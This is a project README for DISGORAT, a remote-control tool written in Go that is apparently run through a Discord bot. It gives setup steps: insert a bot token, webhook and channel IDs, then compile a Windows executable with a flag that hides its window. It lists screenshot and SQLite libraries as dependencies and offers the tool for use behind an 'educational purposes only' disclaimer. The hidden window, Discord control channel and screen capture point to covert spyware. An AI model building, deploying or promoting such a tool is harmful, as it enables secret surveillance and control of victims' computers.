# DISGORAT


## Information ##

DISGORAT is a Remote Administration Tool fully made in golang.\
Change the Bottoken, webhook, guild id, channelid in main.go and you can start

## Installation ##

```bash
git clone https://github.com/Himatric/DiscordGORAT
cd DiscordGORAT
go build -ldflags -H=windowsgui -o FILENAME.exe .
```

## Requirements ##

Golang installed (obviously)\
install [golang](https://go.dev/dl/)
```
go get github.com/sacOO7/gowebsocket github.com/kbinani/screenshot github.com/mattn/go-sqlite3
```

## Disclaimer ##

#### I AM NOT RESPONSIBLE FOR ANY HARM CAUSED WITH THIS. IT IS FOR EDUCATIONAL PURPOSES ONLY! ####

## How to use ##

<img width="505" alt="image" src="https://user-images.githubusercontent.com/84233494/149600186-20410b40-cb61-48bb-a7c2-3d652b840388.png">

## Notes ##

For any extra questions add my discord: Hima#6147

## Terms ##

Reselling of this program is NOT allowed\
Taking credit for the making of the program is also not allowed!
